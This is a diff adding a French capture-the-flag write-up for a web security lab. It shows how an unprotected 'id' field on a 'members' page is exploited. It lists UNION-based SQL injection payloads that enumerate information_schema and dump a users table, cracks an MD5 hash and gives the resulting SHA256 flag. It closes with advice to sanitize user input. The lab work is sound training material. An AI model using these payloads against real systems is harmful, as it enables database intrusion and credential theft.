@@ -1,0 +1,37 @@
+Dans la page members, quand on envoie rien dans le champs id, on a une erreur
+qui nous indique que la base de donnée utilisé est Mysql et que le champs n'est 
+pas protégé et qu'on va pouvoir donc faire ubne injection pour récuperer 
+des informations
+
+1 AND 1=0 UNION SELECT table_schema, table_name FROM information_schema.tables
+
+on voit qu'il y a une table users
+
+1 AND 1=0 UNION SELECT table_name, column_name FROM information_schema.columns
+
+grace a cette commande on obtient toute les collones de la table users
+
+user_id, first_name, last_name, town, country, planet, Commentaire, countersign
+
+ensuite on regarde colonne par colonne laquel correspondrais au password
+
+
+1 AND 1=0 UNION SELECT column_name1, column_name2 FROM users
+1 AND 1=0 UNION SELECT user_id, first_name FROM users
+1 AND 1=0 UNION SELECT last_name, town FROM users
+1 AND 1=0 UNION SELECT country, planet FROM users
+1 AND 1=0 UNION SELECT Commentaire, countersign FROM users
+
+avec la dernière commande qui nous donne:
+ID:  1 AND 1=0 UNION SELECT Commentaire, countersign FROM users 
+First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
+Surname : 5ff9d0165b4f92b14994e5c685cdce28
+
+on decrypte => ca donne FortyTwo crypter en md5
+puis on crypte fortytwo en sha256 => 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
+
+Solution: il faut sanitizer/parser toutes les données rentrer par l'utilisateur 
+
+sources: 
+https://www.asafety.fr/mysql-injection-cheat-sheet/
+https://www.dcode.fr/fonction-hash
